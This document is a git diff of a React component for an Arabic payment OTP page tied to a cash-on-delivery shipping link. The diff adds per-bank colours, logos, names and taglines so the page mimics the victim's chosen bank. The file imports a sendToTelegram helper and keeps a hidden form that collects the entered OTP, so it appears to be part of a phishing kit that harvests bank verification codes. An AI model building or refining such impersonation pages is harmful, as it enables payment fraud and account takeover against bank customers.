@@ -3,11 +3,13 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
+import { Shield, AlertCircle, ArrowLeft, Clock } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
+import { getBankById } from "@/lib/banks";
+import { getBankDesign, getDefaultBankDesign } from "@/lib/bankDesigns";
+import { getBankAssets } from "@/lib/bankAssets";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -31,6 +33,14 @@ const PaymentOTPForm = () => {
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+  
+  // Get bank info from sessionStorage
+  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
+  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
+  
+  // Get bank design specification (always returns a complete design)
+  const bankDesign = selectedBankId ? getBankDesign(selectedBankId) : getDefaultBankDesign();
+  const bankAssets = getBankAssets(selectedBankId);
   
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
@@ -228,146 +238,484 @@ const PaymentOTPForm = () => {
   };
   
   const isOtpComplete = otp.every(digit => digit !== "");
-  const hasAnyDigit = otp.some(digit => digit !== "");
+  
+  // Get button style with exact specifications
+  const getButtonStyles = (): React.CSSProperties => {
+    const baseStyle: React.CSSProperties = {
+      borderRadius: bankDesign.buttonRadius || '8px',
+      color: '#FFFFFF',
+      fontWeight: bankDesign.fontWeight || '500',
+      fontSize: bankDesign.buttonFontSize || bankDesign.fontSize?.body || '16px',
+      padding: bankDesign.buttonPadding || bankDesign.padding?.button || '14px 24px',
+      transition: 'all 0.3s ease',
+      width: '100%',
+    };
+    
+    switch (bankDesign.buttonStyle) {
+      case 'gradient':
+        return {
+          ...baseStyle,
+          background: `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`,
+          border: 'none',
+          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
+        };
+      case 'solid':
+        return {
+          ...baseStyle,
+          background: bankDesign.primaryColor,
+          border: 'none',
+          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
+        };
+      case 'outline':
+        return {
+          ...baseStyle,
+          background: 'transparent',
+          border: `2px solid ${bankDesign.primaryColor}`,
+          color: bankDesign.primaryColor,
+        };
+      case 'elevated':
+        return {
+          ...baseStyle,
+          background: bankDesign.primaryColor,
+          border: 'none',
+          boxShadow: bankDesign.shadow?.button || `0 8px 16px ${bankDesign.primaryColor}40`,
+        };
+      default:
+        return baseStyle;
+    }
+  };
+  
+  // Get input style for OTP boxes
+  const getOTPInputStyle = (hasValue: boolean): React.CSSProperties => {
+    return {
+      width: '56px',
+      height: '64px',
+      textAlign: 'center',
+      fontSize: '28px',
+      fontWeight: 'bold',
+      border: `2px solid ${hasValue ? bankDesign.primaryColor : (bankDesign.borderColor || bankDesign.primaryColor + '40')}`,
+      borderRadius: bankDesign.inputRadius || '12px',
+      backgroundColor: hasValue ? bankDesign.primaryColor + '08' : bankDesign.surfaceColor,
+      color: bankDesign.textColor,
+      transition: 'all 0.2s ease',
+    };
+  };
+  
+  // Layout container style
+  const getLayoutContainerStyle = (): React.CSSProperties => {
+    const baseStyle: React.CSSProperties = {
+      fontFamily: bankDesign.fontFamilyArabic || bankDesign.fontFamily || 'Tajawal, sans-serif',
+      backgroundColor: bankDesign.backgroundColor,
+      color: bankDesign.textColor,
+      minHeight: '100vh',
+      direction: 'rtl',
+    };
+    
+    switch (bankDesign.backgroundPattern) {
+      case 'gradient':
+        return {
+          ...baseStyle,
+          background: `linear-gradient(135deg, ${bankDesign.backgroundColor} 0%, ${bankDesign.surfaceColor} 100%)`,
+        };
+      default:
+        return baseStyle;
+    }
+  };
+  
+  // Get card style
+  const getCardStyle = (): React.CSSProperties => {
+    const baseStyle: React.CSSProperties = {
+      backgroundColor: bankDesign.surfaceColor,
+      borderRadius: bankDesign.borderRadius || '12px',
+      padding: bankDesign.padding?.card || '32px',
+      width: '100%',
+    };
+    
+    switch (bankDesign.cardStyle) {
+      case 'elevated':
+        return {
+          ...baseStyle,
+          boxShadow: bankDesign.shadow?.card || '0 4px 16px rgba(0, 0, 0, 0.1)',
+        };
+      case 'flat':
+        return {
+          ...baseStyle,
+          boxShadow: 'none',
+          border: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
+        };
+      case 'outlined':
+        return {
+          ...baseStyle,
+          border: `2px solid ${bankDesign.borderColor || bankDesign.primaryColor}`,
+          boxShadow: 'none',
+        };
+      case 'gradient':
+        return {
+          ...baseStyle,
+          background: `linear-gradient(135deg, ${bankDesign.surfaceColor} 0%, ${bankDesign.backgroundColor} 100%)`,
+          boxShadow: bankDesign.shadow?.card || '0 4px 16px rgba(0, 0, 0, 0.1)',
+        };
+      default:
+        return baseStyle;
+    }
+  };
+  
+  // Format time
+  const formatTime = (seconds: number) => {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins}:${secs.toString().padStart(2, '0')}`;
+  };
+  
+  const spacing = bankDesign.spacing || { small: '8px', medium: '16px', large: '24px', xlarge: '32px' };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="رمز التحقق"
-      description={`أدخل رمز التحقق لخدمة ${serviceName}`}
-      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
-      {/* Title Section */}
-      <div className="text-center mb-6 sm:mb-8">
-        <div 
-          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
+    <div style={getLayoutContainerStyle()}>
+      {/* Background Pattern/Image if specified */}
+      {bankDesign.backgroundImage && (
+        <div
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            position: 'fixed',
+            top: 0,
+            left: 0,
+            right: 0,
+            bottom: 0,
+            backgroundImage: `url(${bankDesign.backgroundImage})`,
+            backgroundSize: 'cover',
+            backgroundPosition: 'center',
+            opacity: 0.03,
+            zIndex: 0,
           }}
-        >
-          <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
-        </div>
-        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
-        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
-      </div>
-
-      {/* Info */}
-      <div 
-        className="rounded-lg p-3 sm:p-4 mb-6"
+        />
+      )}
+      
+      <div
+        className="flex items-center justify-center min-h-screen"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          padding: bankDesign.padding?.container || '24px',
+          position: 'relative',
+          zIndex: 1,
         }}
       >
-        <p className="text-xs sm:text-sm text-center">
-          تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
-        </p>
-      </div>
-      
-      <form onSubmit={handleSubmit}>
-        {/* OTP Input - 6 digits */}
-        <div className="mb-6">
-          <div className="flex gap-2 sm:gap-3 justify-center items-center mb-4" dir="ltr">
-            {otp.map((digit, index) => (
-              <Input
-                key={index}
-                ref={(el) => (inputRefs.current[index] = el)}
-                type="text"
-                inputMode="numeric"
-                pattern="[0-9]*"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                onPaste={handlePaste}
-                className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
-                style={{
-                  borderColor: digit ? branding.colors.primary : undefined,
-                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
-                }}
-                disabled={attempts >= 3}
-                autoComplete="off"
-              />
-            ))}
-          </div>
-        </div>
-      
-        {/* Error Message */}
-        {error && (
-          <div 
-            className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
-          >
-            <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
-            <p className="text-xs sm:text-sm text-destructive">{error}</p>
-          </div>
-        )}
-        
-        {/* Countdown Timer */}
-        {countdown > 0 && (
-          <div className="text-center mb-6">
-            <p className="text-xs sm:text-sm text-muted-foreground">
-              إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
-            </p>
-          </div>
-        )}
-
-        {/* Attempts Counter */}
-        {attempts > 0 && attempts < 3 && (
-          <div className="text-center mb-6">
-            <p className="text-xs sm:text-sm text-yellow-600">
-              المحاولات المتبقية: <strong>{3 - attempts}</strong>
-            </p>
-          </div>
-        )}
-        
-        {/* Submit Button */}
-        <Button
-          type="submit"
-          size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
-          disabled={attempts >= 3 || !isOtpComplete}
+        <div
           style={{
-            background: attempts >= 3 
-              ? '#666' 
-              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            maxWidth: bankDesign.containerMaxWidth || '480px',
+            width: '100%',
           }}
         >
-          {attempts >= 3 ? (
-            <span>محظور مؤقتاً</span>
-          ) : (
-            <>
-              <span className="ml-2">تأكيد الدفع</span>
-              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-            </>
+          {/* Bank Header */}
+          {bankDesign.showLogo && selectedBank && bankDesign.headerStyle !== 'minimal' && (
+            <div
+              style={{
+                textAlign: 'center',
+                marginBottom: spacing.large,
+              }}
+            >
+              {bankAssets?.logo ? (
+                <img 
+                  src={bankAssets.logo} 
+                  alt={selectedBank?.name || ''}
+                  style={{
+                    width: bankDesign.logoSize || '160px',
+                    height: 'auto',
+                    marginBottom: spacing.medium,
+                  }}
+                  onError={(e) => {
+                    e.currentTarget.style.display = 'none';
+                  }}
+                />
+              ) : (
+                <div
+                  style={{
+                    width: bankDesign.logoSize || '160px',
+                    height: bankDesign.logoSize || '160px',
+                    borderRadius: bankDesign.buttonRadius || '8px',
+                    background: bankDesign.buttonStyle === 'gradient'
+                      ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
+                      : bankDesign.primaryColor,
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    color: '#FFFFFF',
+                    margin: '0 auto',
+                    marginBottom: spacing.medium,
+                  }}
+                >
+                  <Shield style={{ width: '40%', height: '40%' }} />
+                </div>
+              )}
+              
+              {bankDesign.headerStyle === 'prominent' && (
+                <div
+                  style={{
+                    background: bankDesign.buttonStyle === 'gradient'
+                      ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
+                      : bankDesign.primaryColor,
+                    borderRadius: bankDesign.borderRadius || '12px',
+                    padding: spacing.medium,
+                    color: '#FFFFFF',
+                    marginBottom: spacing.medium,
+                  }}
+                >
+                  <h1 style={{ 
+                    fontSize: bankDesign.fontSize?.h2 || '24px', 
+                    fontWeight: bankDesign.fontWeight || '600', 
+                    margin: 0,
+                    marginBottom: spacing.small,
+                  }}>
+                    {selectedBank.nameAr}
+                  </h1>
+                  {bankDesign.showTagline && bankDesign.taglineAr && (
+                    <p style={{ 
+                      fontSize: bankDesign.fontSize?.small || '14px', 
+                      opacity: 0.9, 
+                      margin: 0,
+                    }}>
+                      {bankDesign.taglineAr}
+                    </p>
+                  )}
+                </div>
+              )}
+            </div>
           )}
-        </Button>
-        
-        {countdown === 0 && (
-          <Button
-            type="button"
-            variant="ghost"
-            className="w-full mt-3"
-            style={{ color: branding.colors.primary }}
-            onClick={() => {
-              setCountdown(60);
-              toast({
-                title: "تم إرسال الرمز",
-                description: "تم إرسال رمز تحقق جديد إلى هاتفك",
-              });
-            }}
-          >
-            إعادة إرسال الرمز
-          </Button>
-        )}
-      </form>
-      
-      {/* Demo Info */}
-      <div className="mt-6 p-3 bg-muted/30 rounded-lg text-center">
-        <p className="text-xs text-muted-foreground">
-          🔐 للاختبار: استخدم الرمز <strong className="text-foreground">123456</strong>
-        </p>
+          
+          {/* OTP Card */}
+          <div style={getCardStyle()}>
+            {/* Title Section */}
+            <div style={{ textAlign: 'center', marginBottom: spacing.xlarge }}>
+              <div
+                style={{
+                  width: '80px',
+                  height: '80px',
+                  borderRadius: bankDesign.buttonRadius === '0px' ? '0' : '50%',
+                  margin: '0 auto ' + spacing.large,
+                  background: bankDesign.buttonStyle === 'gradient'
+                    ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
+                    : bankDesign.primaryColor,
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
+                }}
+              >
+                <Shield style={{ width: '40px', height: '40px', color: '#FFFFFF' }} />
+              </div>
+              <h1 style={{ 
+                fontSize: bankDesign.fontSize?.h1 || '32px', 
+                fontWeight: bankDesign.fontWeight || '600', 
+                color: bankDesign.textColor, 
+                marginBottom: spacing.small,
+                margin: 0,
+              }}>
+                رمز التحقق
+              </h1>
+              <p style={{ 
+                fontSize: bankDesign.fontSize?.body || '16px', 
+                color: bankDesign.textSecondaryColor || bankDesign.textColor,
+                opacity: 0.7,
+                margin: 0,
+              }}>
+                أدخل الرمز المرسل إلى هاتفك
+              </p>
+            </div>
+            
+            {/* Info Box */}
+            <div
+              style={{
+                background: bankDesign.primaryColor + '10',
+                border: `1px solid ${bankDesign.primaryColor}30`,
+                borderRadius: bankDesign.borderRadius || '12px',
+                padding: spacing.medium,
+                marginBottom: spacing.large,
+                textAlign: 'center',
+              }}
+            >
+              <p style={{ 
+                fontSize: bankDesign.fontSize?.small || '14px',
+                color: bankDesign.textColor,
+                margin: 0,
+              }}>
+                تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
+              </p>
+            </div>
+            
+            <form onSubmit={handleSubmit}>
+              {/* OTP Input - 6 digits */}
+              <div style={{ marginBottom: spacing.large }}>
+                <div
+                  style={{
+                    display: 'flex',
+                    gap: spacing.small,
+                    justifyContent: 'center',
+                    alignItems: 'center',
+                    marginBottom: spacing.medium,
+                    direction: 'ltr',
+                  }}
+                >
+                  {otp.map((digit, index) => (
+                    <Input
+                      key={index}
+                      ref={(el) => (inputRefs.current[index] = el)}
+                      type="text"
+                      inputMode="numeric"
+                      pattern="[0-9]*"
+                      maxLength={1}
+                      value={digit}
+                      onChange={(e) => handleChange(index, e.target.value)}
+                      onKeyDown={(e) => handleKeyDown(index, e)}
+                      onPaste={handlePaste}
+                      style={getOTPInputStyle(!!digit)}
+                      onFocus={(e) => {
+                        e.target.style.borderColor = bankDesign.primaryColor;
+                        e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
+                      }}
+                      onBlur={(e) => {
+                        e.target.style.borderColor = digit ? bankDesign.primaryColor : (bankDesign.borderColor || bankDesign.primaryColor + '40');
+                        e.target.style.boxShadow = 'none';
+                      }}
+                      disabled={attempts >= 3}
+                      autoComplete="off"
+                    />
+                  ))}
+                </div>
+              </div>
+              
+              {/* Error Message */}
+              {error && (
+                <div
+                  style={{
+                    background: (bankDesign.errorColor || '#DC2626') + '10',
+                    border: `1px solid ${bankDesign.errorColor || '#DC2626'}30`,
+                    borderRadius: bankDesign.borderRadius || '12px',
+                    padding: spacing.medium,
+                    marginBottom: spacing.large,
+                    display: 'flex',
+                    alignItems: 'start',
+                    gap: spacing.small,
+                  }}
+                >
+                  <AlertCircle style={{ 
+                    width: '20px', 
+                    height: '20px', 
+                    color: bankDesign.errorColor || '#DC2626',
+                    flexShrink: 0,
+                    marginTop: '2px',
+                  }} />
+                  <p style={{ 
+                    fontSize: bankDesign.fontSize?.small || '14px', 
+                    color: bankDesign.errorColor || '#DC2626', 
+                    margin: 0,
+                  }}>
+                    {error}
+                  </p>
+                </div>
+              )}
+              
+              {/* Countdown Timer */}
+              {countdown > 0 && (
+                <div style={{ textAlign: 'center', marginBottom: spacing.medium }}>
+                  <div
+                    style={{
+                      display: 'inline-flex',
+                      alignItems: 'center',
+                      gap: spacing.small,
+                      background: bankDesign.primaryColor + '15',
+                      color: bankDesign.primaryColor,
+                      padding: spacing.small + ' ' + spacing.medium,
+                      borderRadius: bankDesign.borderRadius || '12px',
+                      fontSize: bankDesign.fontSize?.small || '14px',
+                      fontWeight: '500',
+                    }}
+                  >
+                    <Clock style={{ width: '16px', height: '16px' }} />
+                    <span>إعادة إرسال الرمز بعد {formatTime(countdown)}</span>
+                  </div>
+                </div>
+              )}
+              
+              {/* Attempts Counter */}
+              {attempts > 0 && attempts < 3 && (
+                <div style={{ textAlign: 'center', marginBottom: spacing.medium }}>
+                  <p style={{ 
+                    fontSize: bankDesign.fontSize?.small || '14px',
+                    color: '#F59E0B',
+                    margin: 0,
+                  }}>
+                    المحاولات المتبقية: <strong>{3 - attempts}</strong>
+                  </p>
+                </div>
+              )}
+              
+              {/* Submit Button */}
+              <Button
+                type="submit"
+                style={{
+                  ...getButtonStyles(),
+                  cursor: (attempts >= 3 || !isOtpComplete) ? 'not-allowed' : 'pointer',
+                  opacity: (attempts >= 3 || !isOtpComplete) ? 0.6 : 1,
+                }}
+                disabled={attempts >= 3 || !isOtpComplete}
+              >
+                {attempts >= 3 ? (
+                  <span>محظور مؤقتاً</span>
+                ) : (
+                  <>
+                    <span className="ml-2">تأكيد الدفع</span>
+                    <ArrowLeft style={{ width: '16px', height: '16px', marginRight: '8px' }} />
+                  </>
+                )}
+              </Button>
+              
+              {/* Resend Code Button */}
+              {countdown === 0 && (
+                <Button
+                  type="button"
+                  style={{
+                    width: '100%',
+                    marginTop: spacing.medium,
+                    background: 'transparent',
+                    border: `1px solid ${bankDesign.primaryColor}`,
+                    color: bankDesign.primaryColor,
+                    borderRadius: bankDesign.buttonRadius || '8px',
+                    padding: spacing.medium,
+                    fontSize: bankDesign.fontSize?.small || '14px',
+                    cursor: 'pointer',
+                  }}
+                  onClick={() => {
+                    setCountdown(60);
+                    toast({
+                      title: "تم إرسال الرمز",
+                      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
+                    });
+                  }}
+                >
+                  إعادة إرسال الرمز
+                </Button>
+              )}
+            </form>
+            
+            {/* Demo Info */}
+            <div
+              style={{
+                marginTop: spacing.large,
+                padding: spacing.medium,
+                background: bankDesign.surfaceColor,
+                border: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
+                borderRadius: bankDesign.borderRadius || '12px',
+                textAlign: 'center',
+              }}
+            >
+              <p style={{ 
+                fontSize: bankDesign.fontSize?.small || '14px',
+                color: bankDesign.textSecondaryColor || bankDesign.textColor,
+                opacity: 0.7,
+                margin: 0,
+              }}>
+                🔐 للاختبار: استخدم الرمز <strong style={{ color: bankDesign.textColor }}>123456</strong>
+              </p>
+            </div>
+          </div>
+        </div>
       </div>
       
       {/* Hidden Netlify Form */}
@@ -382,7 +730,23 @@ const PaymentOTPForm = () => {
         <input type="text" name="otp" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+      
+      <style>{`
+        @keyframes pulse {
+          0%, 100% {
+            opacity: 1;
+          }
+          50% {
+            opacity: 0.8;
+          }
+        }
+      `}</style>
+      
+      {/* Custom CSS if provided */}
+      {bankDesign.customCSS && (
+        <style dangerouslySetInnerHTML={{ __html: bankDesign.customCSS }} />
+      )}
+    </div>
   );
 };
 
